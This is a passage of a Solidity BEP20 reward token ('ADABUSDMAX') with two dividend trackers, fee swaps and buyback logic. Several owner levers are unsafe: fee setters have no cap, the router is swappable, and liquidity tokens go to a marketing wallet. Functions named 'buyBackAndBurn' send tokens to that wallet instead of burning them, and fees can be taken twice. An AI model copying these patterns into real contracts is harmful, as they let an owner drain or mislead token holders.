        newrewardADividendTracker.excludeFromDividends(address(uniswapV2Router));
        newrewardADividendTracker.excludeFromDividends(address(deadAddress));

        rewardaDividendTracker = newrewardADividendTracker;
    }

    function updaterewardBDividendTracker(address newAddress) external onlyOwner {
        rewardBDividendTracker newrewardBDividendTracker = rewardBDividendTracker(payable(newAddress));

        require(newrewardBDividendTracker.owner() == address(this), "must be owned by ADABUSDMAX");

        newrewardBDividendTracker.excludeFromDividends(address(newrewardBDividendTracker));
        newrewardBDividendTracker.excludeFromDividends(address(this));
        newrewardBDividendTracker.excludeFromDividends(address(uniswapV2Router));
        newrewardBDividendTracker.excludeFromDividends(address(deadAddress));

        rewardbDividendTracker = newrewardBDividendTracker;
    }

    function updaterewardADividendRewardFee(uint8 newFee) external onlyOwner {
        rewardaDividendRewardsFee = newFee;
        _updateTotalFee();
    }

    function updaterewardBDividendRewardFee(uint8 newFee) external onlyOwner {
        rewardbDividendRewardsFee = newFee;
        _updateTotalFee();
    }

    function updateMarketingFee(uint8 newFee) external onlyOwner {
        marketingFee = newFee;
        _updateTotalFee();
    }

    function updateBuyBackAndLiquidityFee(uint8 newFee) external onlyOwner {
        buyBackAndLiquidityFee = newFee;
        _updateTotalFee();
    }

    function updateUniswapV2Router(address newAddress) external onlyOwner {
        uniswapV2Router = IUniswapV2Router02(newAddress);
    }

    function excludeFromFees(address account, bool excluded) public onlyOwner {
        require(isExcludedFromFees[account] != excluded, "Already excluded");
        isExcludedFromFees[account] = excluded;

        emit ExcludeFromFees(account, excluded);
    }

    function excludeFromDividend(address account) public onlyOwner {
        rewardaDividendTracker.excludeFromDividends(address(account));
        rewardbDividendTracker.excludeFromDividends(address(account));
    }

    function setAutomatedMarketMakerPair(address pair, bool value) private onlyOwner {
        require(pair != uniswapV2Pair, "cannot be removed");

        _setAutomatedMarketMakerPair(pair, value);
    }

    function _setAutomatedMarketMakerPair(address pair, bool value) private onlyOwner {
        automatedMarketMakerPairs[pair] = value;

        if(value) {
            rewardaDividendTracker.excludeFromDividends(pair);
            rewardbDividendTracker.excludeFromDividends(pair);
        }

        emit SetAutomatedMarketMakerPair(pair, value);
    }

    function updateGasForProcessing(uint256 newValue) external onlyOwner {
        gasForProcessing = newValue;
    }

    function updateMinimumBalanceForDividends(uint256 newMinimumBalance) external onlyOwner {
        rewardaDividendTracker.updateMinimumTokenBalanceForDividends(newMinimumBalance);
        rewardbDividendTracker.updateMinimumTokenBalanceForDividends(newMinimumBalance);
    }

    function updateClaimWait(uint256 claimWait) external onlyOwner {
        rewardaDividendTracker.updateClaimWait(claimWait);
        rewardbDividendTracker.updateClaimWait(claimWait);
    }

    function getrewardAClaimWait() external view returns(uint256) {
        return rewardaDividendTracker.claimWait();
    }

    function getrewardBClaimWait() external view returns(uint256) {
        return rewardbDividendTracker.claimWait();
    }

    function getTotalrewardADividendsDistributed() external view returns (uint256) {
        return rewardaDividendTracker.totalDividendsDistributed();
    }

    function getTotalrewardBDividendsDistributed() external view returns (uint256) {
        return rewardbDividendTracker.totalDividendsDistributed();
    }

    function getIsExcludedFromFees(address account) public view returns(bool) {
        return isExcludedFromFees[account];
    }

    function withdrawablerewardADividendOf(address account) internal view returns(uint256) {
        return rewardaDividendTracker.withdrawableDividendOf(account);
    }

    function withdrawablerewardBDividendOf(address account) internal view returns(uint256) {
        return rewardbDividendTracker.withdrawableDividendOf(account);
    }

    function rewardaDividendTokenBalanceOf(address account) internal view returns (uint256) {
        return rewardaDividendTracker.balanceOf(account);
    }

    function rewardbDividendTokenBalanceOf(address account) internal view returns (uint256) {
        return rewardbDividendTracker.balanceOf(account);
    }

    function getAccountrewardADividendsInfo(address account)
    internal view returns (
        address,
        int256,
        int256,
        uint256,
        uint256,
        uint256,
        uint256,
        uint256) {
        return rewardaDividendTracker.getAccount(account);
    }

    function getAccountrewardBDividendsInfo(address account)
    internal view returns (
        address,
        int256,
        int256,
        uint256,
        uint256,
        uint256,
        uint256,
        uint256) {
        return rewardbDividendTracker.getAccount(account);
    }

    function getAccountrewardADividendsInfoAtIndex(uint256 index)
    internal view returns (
        address,
        int256,
        int256,
        uint256,
        uint256,
        uint256,
        uint256,
        uint256) {
        return rewardaDividendTracker.getAccountAtIndex(index);
    }

    function getAccountrewardBDividendsInfoAtIndex(uint256 index)
    internal view returns (
        address,
        int256,
        int256,
        uint256,
        uint256,
        uint256,
        uint256,
        uint256) {
        return rewardbDividendTracker.getAccountAtIndex(index);
    }

    function processDividendTracker(uint256 gas) external onlyOwner {
        (uint256 aIterations, uint256 aClaims, uint256 aLastProcessedIndex) = rewardaDividendTracker.process(gas);
        emit ProcessedrewardADividendTracker(aIterations, aClaims, aLastProcessedIndex, false, gas, tx.origin);

        (uint256 bIterations, uint256 bClaims, uint256 bLastProcessedIndex) = rewardbDividendTracker.process(gas);
        emit ProcessedrewardBDividendTracker(bIterations, bClaims, bLastProcessedIndex, false, gas, tx.origin);
    }

    function rand() internal view returns(uint256) {
        uint256 seed = uint256(
            keccak256(
                abi.encodePacked(
                    block.timestamp + block.difficulty + ((uint256(keccak256(abi.encodePacked(block.coinbase)))) /
                    (block.timestamp)) + block.gaslimit + ((uint256(keccak256(abi.encodePacked(msg.sender)))) /
                    (block.timestamp)) + block.number)
            )
        );
        uint256 randNumber = (seed - ((seed / 100) * 100));
        if (randNumber == 0) {
            randNumber += 1;
            return randNumber;
        } else {
            return randNumber;
        }
    }

    function claim() external {
        rewardaDividendTracker.processAccount(payable(msg.sender), false);
        rewardbDividendTracker.processAccount(payable(msg.sender), false);
    }

    function getLastrewardADividendProcessedIndex() external view returns(uint256) {
        return rewardaDividendTracker.getLastProcessedIndex();
    }

    function getLastrewardBDividendProcessedIndex() external view returns(uint256) {
        return rewardbDividendTracker.getLastProcessedIndex();
    }

    function getNumberOfrewardADividendTokenHolders() external view returns(uint256) {
        return rewardaDividendTracker.getNumberOfTokenHolders();
    }

    function getNumberOfrewardBDividendTokenHolders() external view returns(uint256) {
        return rewardbDividendTracker.getNumberOfTokenHolders();
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(from != address(0), "zero address");
        require(to != address(0), "zero address");

        bool excludedAccount = isExcludedFromFees[from] || isExcludedFromFees[to];

        if (
            automatedMarketMakerPairs[from] &&
            !excludedAccount
        ) {
            require(amount <= _maxTxAmount, "TX Limit Exceeded");

            uint256 contractBalanceRecipient = balanceOf(to);
            require(contractBalanceRecipient + amount <= _maxWalletToken, "Wallet Limit Exceeded, you can not buy that much.");
        } else if (
            automatedMarketMakerPairs[to] &&
            !excludedAccount
        ) {
            require(amount <= _maxTxAmount, "TX Limit Exceeded");

            uint256 contractTokenBalance = balanceOf(address(this));

            if (!swapping && contractTokenBalance >= swapTokensAtAmount) {
                swapping = true;

                if (marketingEnabled) {
                    uint256 swapTokens = contractTokenBalance.mul(marketingFee).div(totalFees);

                    uint256 beforeAmount = address(this).balance;
                    swapTokensForBNB(swapTokens);
                    uint256 increaseAmount = address(this).balance.sub(beforeAmount);

                    if(increaseAmount > 0){
                        uint256 marketingAPortion = increaseAmount.mul(50).div(10**2);
                        uint256 marketingBPortion = increaseAmount.sub(marketingAPortion);
                        transferToWallet(payable(marketingFeeReceiverA), marketingAPortion);
                        transferToWallet(payable(marketingFeeReceiverB), marketingBPortion);
                    }
                }

                if (buyBackAndLiquifyEnabled) {
                    if(buyBackMode){
                        swapTokensForBNB(contractTokenBalance.mul(buyBackAndLiquidityFee).div(totalFees));
                    }else{
                        swapAndLiquify(contractTokenBalance.mul(buyBackAndLiquidityFee).div(totalFees));
                    }
                }

                if(toBurnADABUSDMAXFee > 0){
                    uint256 swapTokensToBurnADABUSDMAX = contractTokenBalance.mul(toBurnADABUSDMAXFee).div(totalFees);
                    buyBackADABUSDMAXAndBurn(swapTokensToBurnADABUSDMAX);
                }

                if (rewardaDividendEnabled) {
                    uint256 sellTokens = contractTokenBalance.mul(rewardaDividendRewardsFee).div(totalFees);
                    swapAndSendrewardADividends(sellTokens.sub(1300));
                }

                if (rewardbDividendEnabled) {
                    uint256 sellTokens = contractTokenBalance.mul(rewardbDividendRewardsFee).div(totalFees);
                    swapAndSendrewardBDividends(sellTokens.sub(1300));
                }

                swapping = false;
            }

            if (!swapping && buyBackAndLiquifyEnabled && buyBackMode) {

                uint256 buyBackBalanceBnb = address(this).balance;
                if (buyBackBalanceBnb >= minimumBalanceRequired && amount >= minimumSellOrderAmount) {
                    swapping = true;

                    if (buyBackBalanceBnb > buyBackUpperLimit) {
                        buyBackBalanceBnb = buyBackUpperLimit;
                    }

                    buyBackAndBurn(buyBackBalanceBnb.div(10**2));

                    swapping = false;
                }
            }
        }

        if(!swapping && !excludedAccount && sellFeeIncreaseFactorEnabled) {
            uint256 fees = amount.mul(totalFees).div(100);

            if(automatedMarketMakerPairs[to]) {
                fees = fees.mul(sellFeeIncreaseFactor).div(100);
            }

            amount = amount.sub(fees);

            super._transfer(from, address(this), fees);
        }
        
        if(!swapping && !excludedAccount) {
            uint256 fees = amount.mul(totalFees).div(100);

            if(automatedMarketMakerPairs[to]) {
                fees = fees;
            }

            amount = amount.sub(fees);

            super._transfer(from, address(this), fees);
        }

        super._transfer(from, to, amount);

        try rewardaDividendTracker.setBalance(payable(from), balanceOf(from)) {} catch {}
        try rewardbDividendTracker.setBalance(payable(from), balanceOf(from)) {} catch {}
        try rewardaDividendTracker.setBalance(payable(to), balanceOf(to)) {} catch {}
        try rewardbDividendTracker.setBalance(payable(to), balanceOf(to)) {} catch {}

        if(!swapping && to != deadAddress) {
            uint256 gas = gasForProcessing;

            if(rand() <= rewardaDividendPriority) {

                if( rewardaDividendEnabled && sendrewardAInTx ){
                    try rewardaDividendTracker.process(gas) returns (uint256 iterations, uint256 claims, uint256 lastProcessedIndex) {
                        emit ProcessedrewardADividendTracker(iterations, claims, lastProcessedIndex, true, gas, tx.origin);
                    }
                    catch {

                    }
                }

                if( rewardbDividendEnabled && sendrewardBInTx ){
                    try rewardbDividendTracker.process(gas) returns (uint256 iterations, uint256 claims, uint256 lastProcessedIndex) {
                        emit ProcessedrewardBDividendTracker(iterations, claims, lastProcessedIndex, true, gas, tx.origin);
                    }
                    catch {

                    }
                }
            } else {
                if( rewardbDividendEnabled && sendrewardBInTx ){
                    try rewardbDividendTracker.process(gas) returns (uint256 iterations, uint256 claims, uint256 lastProcessedIndex) {
                        emit ProcessedrewardBDividendTracker(iterations, claims, lastProcessedIndex, true, gas, tx.origin);
                    }
                    catch {

                    }
                }

                if( rewardaDividendEnabled && sendrewardAInTx ){
                    try rewardaDividendTracker.process(gas) returns (uint256 iterations, uint256 claims, uint256 lastProcessedIndex) {
                        emit ProcessedrewardADividendTracker(iterations, claims, lastProcessedIndex, true, gas, tx.origin);
                    }
                    catch {

                    }
                }
            }
        }
    }

    function swapAndLiquify(uint256 contractTokenBalance) private {

        uint256 half = contractTokenBalance.div(2);
        uint256 otherHalf = contractTokenBalance.sub(half);

        uint256 initialBalance = address(this).balance;

        swapTokensForBNB(half);

        uint256 newBalance = address(this).balance.sub(initialBalance);

        addLiquidity(otherHalf, newBalance);

        emit SwapAndLiquify(half, newBalance, otherHalf);
    }

    function addLiquidity(uint256 tokenAmount, uint256 bnbAmount) private {

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        uniswapV2Router.addLiquidityETH{value: bnbAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            marketingFeeReceiverA,
            block.timestamp.add(300)
        );
    }

    function buyBackADABUSDMAXAndBurn(uint256 amount) private {
        address[] memory path = new address[](3);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        path[2] = toBurnADABUSDMAXAddress;

        _approve(address(this), address(uniswapV2Router), amount);

        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            0,
            path,
            marketingFeeReceiverA,
            block.timestamp.add(300)
        );
    }

    function buyBackAndBurn(uint256 amount) private {

        address[] memory path = new address[](2);
        path[0] = uniswapV2Router.WETH();
        path[1] = address(this);

        uniswapV2Router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: amount}(
            0,
            path,
            marketingFeeReceiverA,
            block.timestamp.add(300)
        );
    }

    function manualBuyBackAndBurn(uint256 _amount) public onlyOwner {
        uint256 balance = address(this).balance;
        require(buyBackAndLiquifyEnabled, "not enabled");
        require(balance >= minimumBalanceRequired.add(_amount), "amount is too big");

        if (
            !swapping
        ) {
            buyBackAndBurn(_amount);
        }
    }

    function swapTokensForBNB(uint256 tokenAmount) private {

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp.add(300)
        );

    }

    function swapTokensForDividendToken(uint256 _tokenAmount, address _recipient, address _dividendAddress) private {
        address[] memory path;

        if(uniswapV2Router.WETH() == _dividendAddress){
            path = new address[](2);
            path[0] = address(this);
            path[1] = _dividendAddress;
        }else{
            path = new address[](3);
            path[0] = address(this);
            path[1] = uniswapV2Router.WETH();
            path[2] = _dividendAddress;
        }

        _approve(address(this), address(uniswapV2Router), _tokenAmount);

        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            _tokenAmount,
            0,
            path,
            _recipient,
            block.timestamp.add(300)
        );
    }

    function swapAndSendrewardADividends(uint256 tokens) private {
        uint256 beforeAmount = IERC20(rewardaDividendToken).balanceOf(address(rewardaDividendTracker));

        swapTokensForDividendToken(tokens, address(rewardaDividendTracker), rewardaDividendToken);

        uint256 rewardaDividends = IERC20(rewardaDividendToken).balanceOf(address(rewardaDividendTracker)).sub(beforeAmount);

        if(rewardaDividends > 0){
            rewardaDividendTracker.distributeDividends(rewardaDividends);
            emit SendDividends(rewardaDividends);
        }
    }

    function swapAndSendrewardBDividends(uint256 tokens) private {
        uint256 beforeAmount = IERC20(rewardbDividendToken).balanceOf(address(rewardbDividendTracker));

        swapTokensForDividendToken(tokens, address(rewardbDividendTracker), rewardbDividendToken);

        uint256 rewardbDividends = IERC20(rewardbDividendToken).balanceOf(address(rewardbDividendTracker)).sub(beforeAmount);

        if(rewardbDividends > 0){
            rewardbDividendTracker.distributeDividends(rewardbDividends);
            emit SendDividends(rewardbDividends);
        }
    }

    function transferToWallet(address payable recipient, uint256 amount) private {
        recipient.transfer(amount);
    }
}

contract rewardADividendTracker is DividendPayingToken, Ownable {
    using SafeMath for uint256;
    using SafeMathInt for int256;
    using IterableMapping for IterableMapping.Map;

    IterableMapping.Map private tokenHoldersMap;
    uint256 public lastProcessedIndex;

    mapping (address => bool) public excludedFromDividends;

    mapping (address => uint256) public lastClaimTimes;

    uint256 public claimWait;
    uint256 public minimumTokenBalanceForDividends;

    event ExcludeFromDividends(address indexed account);

    event Claim(address indexed account, uint256 amount, bool indexed automatic);

    constructor() DividendPayingToken("rewardA_Dividend_Tracker", "rewardA_Dividend_Tracker", 0x3EE2200Efb3400fAbB9AacF31297cBdD1d435D47) {
        claimWait = 3600;
        minimumTokenBalanceForDividends = 200000 * (10**9);
    }

    function _transfer(address, address, uint256) pure internal override {
        require(false, "No allowed");
    }

    function withdrawDividend() pure public override {
        require(false, "disabled");
    }

    function setDividendTokenAddress(address newToken) external override onlyOwner {
        dividendToken = newToken;
    }

    function updateMinimumTokenBalanceForDividends(uint256 _newMinimumBalance) external onlyOwner {
        minimumTokenBalanceForDividends = _newMinimumBalance * (10**9);
    }

    function excludeFromDividends(address account) external onlyOwner {

        excludedFromDividends[account] = true;

        _setBalance(account, 0);
        tokenHoldersMap.remove(account);

        emit ExcludeFromDividends(account);
    }

    function updateClaimWait(uint256 newClaimWait) external onlyOwner {
        require(newClaimWait >= 60 && newClaimWait <= 86400, "wrong");
        claimWait = newClaimWait;
    }

    function getLastProcessedIndex() external view returns(uint256) {
        return lastProcessedIndex;
    }

    function getNumberOfTokenHolders() external view returns(uint256) {
        return tokenHoldersMap.keys.length;
    }


    function getAccount(address _account)
    public view returns (
        address account,
        int256 index,
        int256 iterationsUntilProcessed,
        uint256 withdrawableDividends,
        uint256 totalDividends,
        uint256 lastClaimTime,
        uint256 nextClaimTime,
        uint256 secondsUntilAutoClaimAvailable) {
        account = _account;

        index = tokenHoldersMap.getIndexOfKey(account);

        iterationsUntilProcessed = -1;

        if(index >= 0) {
            if(uint256(index) > lastProcessedIndex) {
                iterationsUntilProcessed = index.sub(int256(lastProcessedIndex));
            }
            else {
                uint256 processesUntilEndOfArray = tokenHoldersMap.keys.length > lastProcessedIndex ?
                tokenHoldersMap.keys.length.sub(lastProcessedIndex) :
                0;


                iterationsUntilProcessed = index.add(int256(processesUntilEndOfArray));
            }
        }


        withdrawableDividends = withdrawableDividendOf(account);
        totalDividends = accumulativeDividendOf(account);

        lastClaimTime = lastClaimTimes[account];

        nextClaimTime = lastClaimTime > 0 ?
        lastClaimTime.add(claimWait) :
        0;

        secondsUntilAutoClaimAvailable = nextClaimTime > block.timestamp ?
        nextClaimTime.sub(block.timestamp) :
        0;
    }

    function getAccountAtIndex(uint256 index)
    public view returns (
        address,
        int256,
        int256,
        uint256,
        uint256,
        uint256,
        uint256,
        uint256) {
        if(index >= tokenHoldersMap.size()) {
            return (0x0000000000000000000000000000000000000000, -1, -1, 0, 0, 0, 0, 0);
        }

        address account = tokenHoldersMap.getKeyAtIndex(index);

        return getAccount(account);
    }

    function canAutoClaim(uint256 lastClaimTime) private view returns (bool) {
        if(lastClaimTime > block.timestamp)  {
            return false;
        }

        return block.timestamp.sub(lastClaimTime) >= claimWait;
    }

    function setBalance(address payable account, uint256 newBalance) external onlyOwner {
        if(excludedFromDividends[account]) {
            return;
        }

        if(newBalance >= minimumTokenBalanceForDividends) {
            _setBalance(account, newBalance);
            tokenHoldersMap.set(account, newBalance);
        }
        else {
            _setBalance(account, 0);
            tokenHoldersMap.remove(account);
        }

        processAccount(account, true);
    }

    function process(uint256 gas) public returns (uint256, uint256, uint256) {
        uint256 numberOfTokenHolders = tokenHoldersMap.keys.length;

        if(numberOfTokenHolders == 0) {
            return (0, 0, lastProcessedIndex);
        }

        uint256 _lastProcessedIndex = lastProcessedIndex;

        uint256 gasUsed = 0;

        uint256 gasLeft = gasleft();

        uint256 iterations = 0;
        uint256 claims = 0;

        while(gasUsed < gas && iterations < numberOfTokenHolders) {
            _lastProcessedIndex++;

            if(_lastProcessedIndex >= tokenHoldersMap.keys.length) {
                _lastProcessedIndex = 0;
            }

            address account = tokenHoldersMap.keys[_lastProcessedIndex];

            if(canAutoClaim(lastClaimTimes[account])) {
                if(processAccount(payable(account), true)) {
                    claims++;
                }
            }

            iterations++;

            uint256 newGasLeft = gasleft();

            if(gasLeft > newGasLeft) {
                gasUsed = gasUsed.add(gasLeft.sub(newGasLeft));
            }

            gasLeft = newGasLeft;
        }

        lastProcessedIndex = _lastProcessedIndex;

        return (iterations, claims, lastProcessedIndex);
    }

    function processAccount(address payable account, bool automatic) public onlyOwner returns (bool) {
        uint256 amount = _withdrawDividendOfUser(account);

        if(amount > 0) {
            lastClaimTimes[account] = block.timestamp;
            emit Claim(account, amount, automatic);
            return true;
        }

        return false;
    }
}

contract rewardBDividendTracker is DividendPayingToken, Ownable {
    using SafeMath for uint256;
    using SafeMathInt for int256;
    using IterableMapping for IterableMapping.Map;

    IterableMapping.Map private tokenHoldersMap;
    uint256 public lastProcessedIndex;

    mapping (address => bool) public excludedFromDividends;

    mapping (address => uint256) public lastClaimTimes;

    uint256 public claimWait;
    uint256 public minimumTokenBalanceForDividends;

    event ExcludeFromDividends(address indexed account);

    event Claim(address indexed account, uint256 amount, bool indexed automatic);

    constructor() DividendPayingToken("rewardB_Dividend_Tracker", "rewardB_Dividend_Tracker", 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56) {
        claimWait = 3600;
        minimumTokenBalanceForDividends = 200000 * (10**9);
    }

    function _transfer(address, address, uint256) pure internal override {
        require(false, "No allowed");
    }

    function withdrawDividend() pure public override {
        require(false, "withdrawDividend disabled");
    }

    function setDividendTokenAddress(address newToken) external override onlyOwner {
        dividendToken = newToken;
    }

    function updateMinimumTokenBalanceForDividends(uint256 _newMinimumBalance) external onlyOwner {
        minimumTokenBalanceForDividends = _newMinimumBalance * (10**9);
    }

    function excludeFromDividends(address account) external onlyOwner {
        require(!excludedFromDividends[account]);
        excludedFromDividends[account] = true;

        _setBalance(account, 0);
        tokenHoldersMap.remove(account);

        emit ExcludeFromDividends(account);
    }

    function updateClaimWait(uint256 newClaimWait) external onlyOwner {
        require(newClaimWait >= 60 && newClaimWait <= 86400, "wrong");
        claimWait = newClaimWait;
    }

    function getLastProcessedIndex() external view returns(uint256) {
        return lastProcessedIndex;
    }

    function getNumberOfTokenHolders() external view returns(uint256) {
        return tokenHoldersMap.keys.length;
    }


    function getAccount(address _account)
    public view returns (
        address account,
        int256 index,
        int256 iterationsUntilProcessed,
        uint256 withdrawableDividends,
        uint256 totalDividends,
        uint256 lastClaimTime,
        uint256 nextClaimTime,
        uint256 secondsUntilAutoClaimAvailable) {
        account = _account;

        index = tokenHoldersMap.getIndexOfKey(account);

        iterationsUntilProcessed = -1;

        if(index >= 0) {
            if(uint256(index) > lastProcessedIndex) {
                iterationsUntilProcessed = index.sub(int256(lastProcessedIndex));
            }
            else {
                uint256 processesUntilEndOfArray = tokenHoldersMap.keys.length > lastProcessedIndex ?
                tokenHoldersMap.keys.length.sub(lastProcessedIndex) :
                0;


                iterationsUntilProcessed = index.add(int256(processesUntilEndOfArray));
            }
        }


        withdrawableDividends = withdrawableDividendOf(account);
        totalDividends = accumulativeDividendOf(account);

        lastClaimTime = lastClaimTimes[account];

        nextClaimTime = lastClaimTime > 0 ?
        lastClaimTime.add(claimWait) :
        0;

        secondsUntilAutoClaimAvailable = nextClaimTime > block.timestamp ?
        nextClaimTime.sub(block.timestamp) :
        0;
    }

    function getAccountAtIndex(uint256 index)
    public view returns (
        address,
        int256,
        int256,
        uint256,
        uint256,
        uint256,
        uint256,
        uint256) {
        if(index >= tokenHoldersMap.size()) {
            return (0x0000000000000000000000000000000000000000, -1, -1, 0, 0, 0, 0, 0);
        }

        address account = tokenHoldersMap.getKeyAtIndex(index);

        return getAccount(account);
    }

    function canAutoClaim(uint256 lastClaimTime) private view returns (bool) {
        if(lastClaimTime > block.timestamp)  {
            return false;
        }

        return block.timestamp.sub(lastClaimTime) >= claimWait;
    }

    function setBalance(address payable account, uint256 newBalance) external onlyOwner {
        if(excludedFromDividends[account]) {
            return;
        }

        if(newBalance >= minimumTokenBalanceForDividends) {
            _setBalance(account, newBalance);
            tokenHoldersMap.set(account, newBalance);
        }
        else {
            _setBalance(account, 0);
            tokenHoldersMap.remove(account);
        }

        processAccount(account, true);
    }

    function process(uint256 gas) public returns (uint256, uint256, uint256) {
        uint256 numberOfTokenHolders = tokenHoldersMap.keys.length;

        if(numberOfTokenHolders == 0) {
            return (0, 0, lastProcessedIndex);
        }

        uint256 _lastProcessedIndex = lastProcessedIndex;

        uint256 gasUsed = 0;

        uint256 gasLeft = gasleft();

        uint256 iterations = 0;
        uint256 claims = 0;

        while(gasUsed < gas && iterations < numberOfTokenHolders) {
            _lastProcessedIndex++;

            if(_lastProcessedIndex >= tokenHoldersMap.keys.length) {
                _lastProcessedIndex = 0;
            }

            address account = tokenHoldersMap.keys[_lastProcessedIndex];

            if(canAutoClaim(lastClaimTimes[account])) {
                if(processAccount(payable(account), true)) {
                    claims++;
                }
            }

            iterations++;

            uint256 newGasLeft = gasleft();

            if(gasLeft > newGasLeft) {
                gasUsed = gasUsed.add(gasLeft.sub(newGasLeft));
            }

            gasLeft = newGasLeft;
        }

        lastProcessedIndex = _lastProcessedIndex;

        return (iterations, claims, lastProcessedIndex);
    }

    function processAccount(address payable account, bool automatic) public onlyOwner returns (bool) {
        uint256 amount = _withdrawDividendOfUser(account);

        if(amount > 0) {
            lastClaimTimes[account] = block.timestamp;
            emit Claim(account, amount, automatic);
            return true;
        }

        return false;
    }

    //CONTRACT PERFECTED BY @RAINING_SHITCOINS - BNB BEP20 DONATIONS FOR FURTHER WORK CAN BE SENT TO 0x3C8eEc63D0eB8EcD0451B29cEb1a715e2bda573F
}